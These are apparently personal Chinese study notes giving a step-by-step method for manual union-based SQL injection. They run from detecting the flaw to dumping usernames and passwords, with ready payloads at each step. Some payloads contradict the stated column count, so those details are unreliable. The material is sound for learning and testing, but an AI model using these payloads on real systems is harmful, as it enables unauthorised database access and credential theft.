1.先判断是否存在注入
2.判断注入类型 数字型或者字符型 
?id=1 and 1=1正常且id=1 and 1=2正常则为字符型注入
?id=1 and 1=1正常且id=1 and 1=2不正常为数字型注入
3.判断闭合方式（字符型注入）
单引号闭合  双引号闭合 引号括号闭合  双引号括号闭合
4.判断字段数
id=1’order by 3--+正常
id=1'  order by 4--+不正常
说明字段数为3
实际上这里本质的目的是为了判断原始查询的内容返回的列数，比如

```python
SELECT id, username, email FROM users WHERE id = '用户输入'
```
回显应该是3列，然后我们的输入内容是id=1' order by 3就是按顺序排列，然后如果把3改成4，那么第四列不存在就会报错，因此我们就可以判断原始查询中存在3列，那么我们后续查数据库名也要使用3位，就是1,2，database()#这样子，而这里判断也可以使用union select 去判断，select 1  select1,2   select 1,2,3这样子去判断
5.判断回显位(联合注入)
-1' union select 1,2,3--+ //判断回显点-1' 
让union前面的语句为错，从而显示后面的内容
6.显示数据库名
2，3字段在页面回显，则可以使用2，3改为database（）来显示数据库名
-1' union select 1,2,database()--+ //得到数据库名
7.显示表名
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#/'数据库名'--+ //得到该数据库下的所有表名
8.显示字段名
-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='users'#--+ //得到users表中的字段名
9.显示字段中的内容
-1' union select 1,2,3,group_concat(username,password) from users# //得到users表中username，password的内容
得到username和password
